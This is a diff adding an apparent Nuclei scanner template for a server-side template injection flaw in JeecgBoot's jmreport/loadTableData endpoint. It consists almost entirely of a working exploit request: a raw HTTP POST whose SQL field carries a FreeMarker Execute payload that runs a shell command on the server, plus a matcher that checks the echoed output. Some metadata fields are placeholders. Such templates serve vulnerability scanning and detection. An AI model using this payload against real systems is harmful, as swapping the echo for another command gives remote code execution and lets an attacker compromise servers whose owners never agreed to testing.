@@ -1,0 +1,26 @@
+id: jeecg-jmreport-loadTableData-rce
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: JeecgBoot jmreport/loadTableData SSTI模板注入漏洞
+  reference:
+    - https://github.com/MInggongK/jeecg-/releases/tag/jeecgfdfg
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /jeecg-boot/jmreport/loadTableData HTTP/1.1
+        Content-Type: application/json; charset=utf-8
+        Content-Length: 170
+        Host: {{Hostname}}
+        Connection: close
+        Accept-Encoding: gzip, deflate
+        User-Agent: okhttp/4.9.2
+
+        {"dbSource":"","sql":"select '<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"echo 888888\")}'","tableName":"test_demo);","pageNo":1,"pageSize":10}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '888888'
